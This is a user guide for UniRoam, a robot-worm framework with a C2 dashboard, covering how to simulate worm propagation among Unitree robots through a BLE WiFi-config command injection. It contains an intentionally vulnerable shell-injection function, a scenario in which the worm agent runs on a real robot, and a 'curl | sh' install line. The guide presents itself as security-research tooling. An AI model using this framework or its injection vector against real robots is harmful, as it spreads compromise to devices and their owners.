# UniRoam Robot Simulator Guide

Complete guide for testing worm propagation using simulated Unitree robots.

## Table of Contents

1. [Overview](#overview)
2. [Quick Start](#quick-start)
3. [Virtual Mode](#virtual-mode)
4. [Distributed Mode](#distributed-mode)
5. [Simulator Architecture](#simulator-architecture)
6. [Testing Scenarios](#testing-scenarios)
7. [Troubleshooting](#troubleshooting)

---

## Overview

The UniRoam simulator system allows you to test worm propagation without needing a fleet of real robots. It provides:

- **Realistic Protocol Emulation**: Full BLE stack with AES encryption
- **True Propagation**: Simulators actually execute the worm agent
- **Flexible Deployment**: Virtual (single device) or distributed (multiple devices)
- **Safe Execution**: Sandboxed command execution
- **C2 Integration**: Full integration with existing C2 dashboard

###  Features

| Feature | Virtual Mode | Distributed Mode |
|---------|--------------|------------------|
| BLE Emulation | Software-only | Real BLE hardware |
| Robots per Device | 10-50+ | 1-5 |
| Deployment | Single machine | Multiple devices |
| Resource Usage | Low | Medium |
| Realism | High | Very High |

---

## Quick Start

### Prerequisites

```bash
# Install dependencies
pip install -r requirements.txt

# Set environment variables
export VIRTUAL_BLE=true  # For virtual mode
export C2_HOST=localhost
export C2_PORT=8443
```

### 1. Start C2 Server

```bash
python run_c2.py
```

Access dashboard at `http://localhost:8443/`

### 2. Launch Virtual Simulators

```bash
# Start 10 virtual robots
python run_virtual_sim.py -n 10

# Or with auto-infection
python run_virtual_sim.py -n 10 --auto-infect SIM_000
```

### 3. Watch Propagation

Open the C2 dashboard and observe:
- Robots appearing in the infected list
- Simulators marked with 🤖 icon
- Real-time infection status

---

## Virtual Mode

Virtual mode runs multiple simulated robots on a single machine using software BLE emulation.

### Basic Usage

```bash
# Launch 5 robots (default)
python run_virtual_sim.py

# Launch 20 robots
python run_virtual_sim.py -n 20

# Interactive mode
python run_virtual_sim.py -n 10 --interactive
```

### Interactive Commands

When running with `--interactive`:

```
simulator> list              # List all simulators
simulator> status            # Show infection status
simulator> infect SIM_003    # Manually infect a robot
simulator> help              # Show available commands
simulator> exit              # Exit interactive mode
```

### Configuration

Environment variables for virtual mode:

```bash
# Number of simulators
export SIMULATOR_COUNT=10

# Sandbox type (subprocess, docker, none)
export SANDBOX_TYPE=subprocess

# C2 server URL
export C2_HOST=192.168.1.100
export C2_PORT=8443
```

### Example Session

```bash
# Terminal 1: Start C2
python run_c2.py

# Terminal 2: Start simulators with interactive mode
python run_virtual_sim.py -n 15 --interactive

# In interactive prompt:
simulator> list
# Shows: SIM_000 through SIM_014

simulator> infect SIM_000
# [!] Infected SIM_000

simulator> status
# Infection Status: 1/15 (6.7%)
#   🦠 SIM_000
#   ✓ SIM_001
#   ✓ SIM_002
#   ...

# Watch propagation happen automatically!
```

---

## Distributed Mode

Distributed mode deploys simulators across multiple physical devices (Raspberry Pis, laptops, etc.).

### Setup

#### 1. Create Configuration File

Create `simulator_config.json`:

```json
{
  "simulators": [
    {
      "host": "192.168.1.101",
      "port": 5555,
      "serial": "SIM_000",
      "model": "Go2",
      "comment": "Raspberry Pi 1"
    },
    {
      "host": "192.168.1.102",
      "port": 5555,
      "serial": "SIM_001",
      "model": "G1",
      "comment": "Raspberry Pi 2"
    },
    {
      "host": "192.168.1.103",
      "port": 5555,
      "serial": "SIM_002",
      "model": "B2",
      "comment": "Laptop"
    }
  ]
}
```

#### 2. Deploy to Devices

```bash
# Deploy to Raspberry Pi
./deploy_sim_pi.sh pi@192.168.1.101 Go2 SIM_000 http://192.168.1.100:8443

# Or deploy to all devices
for device in 101 102 103; do
  ./deploy_sim_pi.sh pi@192.168.1.$device Go2 SIM_$(printf '%03d' $((device-101)))
done
```

#### 3. Start Distributed Simulation

```bash
# Start coordinator
python run_distributed_sim.py \
  --c2-url http://192.168.1.100:8443 \
  --config simulator_config.json \
  --patient-zero SIM_000
```

### Manual Deployment

If you prefer manual deployment:

```bash
# On each device:
cd ~/uniroam
python3 robot_simulator.py \
  --model Go2 \
  --serial SIM_XXX \
  --mode distributed \
  --c2-url http://192.168.1.100:8443
```

### Monitoring

```bash
# View logs on remote device
ssh pi@192.168.1.101 journalctl -u robot_simulator -f

# Check service status
ssh pi@192.168.1.101 sudo systemctl status robot_simulator

# Restart simulator
ssh pi@192.168.1.101 sudo systemctl restart robot_simulator
```

---

## Simulator Architecture

### Components

```
┌─────────────────────────────────────────────┐
│          Virtual BLE Adapter                │
│  (Software BLE without hardware)            │
└────────────┬────────────────────────────────┘
             │
    ┌────────┴────────┬────────────┐
    │                 │            │
┌───▼───────┐  ┌─────▼──────┐  ┌──▼──────────┐
│ Robot Sim │  │ Robot Sim  │  │ Robot Sim   │
│  Go2_001  │  │  G1_002    │  │  B2_003     │
└───┬───────┘  └─────┬──────┘  └──┬──────────┘
    │                │            │
    │   ┌────────────▼────────────▼─┐
    └───►   Command Sandbox         │
        │  (Isolated execution)     │
        └────────────┬───────────────┘
                     │
            ┌────────▼────────┐
            │  Worm Agent     │
            │  (When infected)│
            └────────┬────────┘
                     │
            ┌────────▼────────┐
            │  C2 Server      │
            │  (Dashboard)    │
            └─────────────────┘
```

### BLE Protocol Emulation

The simulator fully emulates the Unitree BLE protocol:

1. **Advertisement**: Broadcasts device name (Go2_SIM_001)
2. **Connection**: Accepts BLE connections
3. **Handshake**: Validates "unitree" secret
4. **Command Processing**:
   - Instruction 1: Handshake
   - Instruction 2: Serial number (chunked)
   - Instruction 3: WiFi config (VULNERABLE!)
   - Instruction 4: Command execution

### Vulnerability Emulation

```python
# Simulated vulnerable function
def _handle_wifi_config(self, packet):
    ssid = extract_ssid(packet)  # User input
    
    # VULNERABLE: No sanitization!
    command = f'wpa_supplicant -c "{ssid}"'
    
    # Execute in sandbox (allows injection)
    result = self.sandbox.execute(command)
    
    # Detect infection
    if "python" in ssid:
        self.spawn_worm_agent()
```

### Sandbox Execution

Commands are executed in an isolated environment:

- **Subprocess Mode**: Restricted environment variables
- **Docker Mode**: Full container isolation
- **Command Blacklist**: Blocks dangerous commands

---

## Testing Scenarios

### Scenario 1: Basic Propagation Test

Test single-hop propagation:

```bash
# Start 3 robots
python run_virtual_sim.py -n 3

# In C2 dashboard, send command to SIM_000:
# Task Type: EXECUTE_CMD
# Command: Uses WiFi injection to infect

# Observe: SIM_000 → SIM_001 → SIM_002
```

### Scenario 2: Rate Limiting Test

Verify propagation rate limits:

```bash
# Start 20 robots
python run_virtual_sim.py -n 20 --auto-infect SIM_000

# Watch in C2 dashboard
# Should see ~5 infections per hour (rate limit)
```

### Scenario 3: Mixed Real + Simulated

Test with one real robot and multiple simulators:

```bash
# Start simulators (will be visible via BLE)
python run_virtual_sim.py -n 10

# On real robot:
python -m uniroam.worm_agent --c2-url http://your-c2:8443

# Real robot should discover and infect simulators
# Simulators can infect back!
```

### Scenario 4: Distributed Lab

Large-scale propagation test:

```bash
# Deploy 3 simulators per device across 5 Raspberry Pis
# Total: 15 robots

python run_distributed_sim.py \
  --c2-url http://192.168.1.100:8443 \
  --patient-zero SIM_000

# Monitor propagation graph in C2 dashboard
```

### Scenario 5: Defense Testing

Test detection rules:

```bash
# Start simulators with monitoring
python run_virtual_sim.py -n 10

# Run your IDS/detection scripts
# Check for:
# - Suspicious BLE traffic
# - Command injection patterns
# - Unusual process spawning
```

---

## C2 Dashboard Integration

### Visual Differentiation

Simulators are marked in the C2 dashboard:

- **Icon**: 🤖 (simulator) vs 🦿 (real robot)
- **Color**: Green border-left highlight
- **Type Column**: Shows "SIM" or "REAL"

### Database Schema

Simulators are tagged in the database:

```sql
SELECT 
  robot_id,
  is_simulator,
  simulator_host,
  infection_depth
FROM robots
WHERE is_simulator = 1;
```

### Filtering

Filter by robot type in dashboard:

```javascript
// Show only real robots
const realRobots = robots.filter(r => !r.is_simulator);

// Show only simulators
const sims = robots.filter(r => r.is_simulator);
```

---

## Performance

### Resource Usage

| Mode | CPU (per robot) | RAM (per robot) | Network |
|------|----------------|-----------------|---------|
| Virtual | 5-10% | 50-100 MB | Minimal |
| Distributed | 10-20% | 100-200 MB | Moderate |

### Scaling

- **Single Device**: 10-50 robots (depending on hardware)
- **Raspberry Pi 4**: 3-5 robots recommended
- **Desktop/Laptop**: 20-50 robots possible

### Optimization Tips

```bash
# Reduce beacon frequency
export BEACON_INTERVAL_MIN=300  # 5 minutes

# Limit propagation rate
export PROPAGATION_RATE_LIMIT=3  # 3 infections/hour

# Use lightweight sandbox
export SANDBOX_TYPE=subprocess  # Instead of docker
```

---

## Troubleshooting

### Common Issues

#### 1. "Module 'bleak' not found"

```bash
# Install dependencies
pip install -r requirements.txt
```

#### 2. "Virtual BLE not working"

```bash
# Ensure virtual mode is enabled
export VIRTUAL_BLE=true

# Check if virtual_ble.py is in same directory
ls virtual_ble.py
```

#### 3. "Simulators not appearing in C2"

```bash
# Check C2 URL is correct
echo $C2_HOST
echo $C2_PORT

# Verify C2 is running
curl http://localhost:8443/api/v1/status

# Check simulator logs
# (Look for beacon/registration errors)
```

#### 4. "Permission denied" on deploy script

```bash
# Make script executable
chmod +x deploy_sim_pi.sh

# Check SSH access
ssh pi@192.168.1.101 echo "OK"
```

#### 5. "Docker not found" for sandbox

```bash
# Install Docker (optional)
curl -fsSL https://get.docker.com | sh

# Or use subprocess sandbox
export SANDBOX_TYPE=subprocess
```

### Debug Mode

Enable verbose logging:

```bash
export WORM_DEBUG=true
python run_virtual_sim.py -n 5
```

### Logs

Check simulator logs:

```bash
# Virtual mode
# Logs printed to console

# Distributed mode
ssh pi@192.168.1.101 journalctl -u robot_simulator -f
```

---

## Best Practices

### 1. Start Small

Begin with 3-5 simulators to verify setup:

```bash
python run_virtual_sim.py -n 3 --interactive
```

### 2. Use Interactive Mode

Interactive mode helps debug propagation:

```bash
simulator> status  # Check infection count
simulator> list    # Verify all robots running
```

### 3. Monitor C2 Dashboard

Keep the C2 dashboard open to watch propagation in real-time.

### 4. Clean Up

After testing, clean up sandbox directories:

```bash
rm -rf /tmp/robot_sim_*
```

### 5. Version Control Config

Save your simulator configs:

```bash
cp simulator_config.json configs/test_scenario_1.json
```

---

## Security Notes

⚠️ **IMPORTANT**: Simulators are for controlled testing only!

- Run in isolated network
- Don't expose C2 server to internet
- Use strong passwords for C2 operator access
- Clean up after testing
- Review sandbox command logs

---

## Advanced Usage

### Custom Simulator Configuration

Create custom robot models:

```python
from robot_simulator import UnitreeSimulator

# Create custom simulator
sim = UnitreeSimulator(
    model="CustomBot",
    serial="CUSTOM_001",
    mode="virtual"
)

# Attach to adapter
from virtual_ble import get_virtual_adapter
adapter = get_virtual_adapter()
sim.attach_ble(adapter)

# Run
await sim.run()
```

### Programmatic Control

Control simulators via Python:

```python
import asyncio
from robot_simulator import create_simulator

async def main():
    # Create 10 simulators
    sims = [await create_simulator(serial=f"SIM_{i:03d}") 
            for i in range(10)]
    
    # Infect first one
    await sims[0]._handle_infection("MANUAL")
    
    # Run all
    await asyncio.gather(*[s.run() for s in sims])

asyncio.run(main())
```

---

## Support

For issues or questions:

1. Check this guide
2. Review `DEPLOYMENT.md`
3. Check GitHub issues
4. Enable debug mode for detailed logs

---

**UniRoam v1.0 - Autonomous Robot Worm Framework**  
*For authorized security research and testing only*

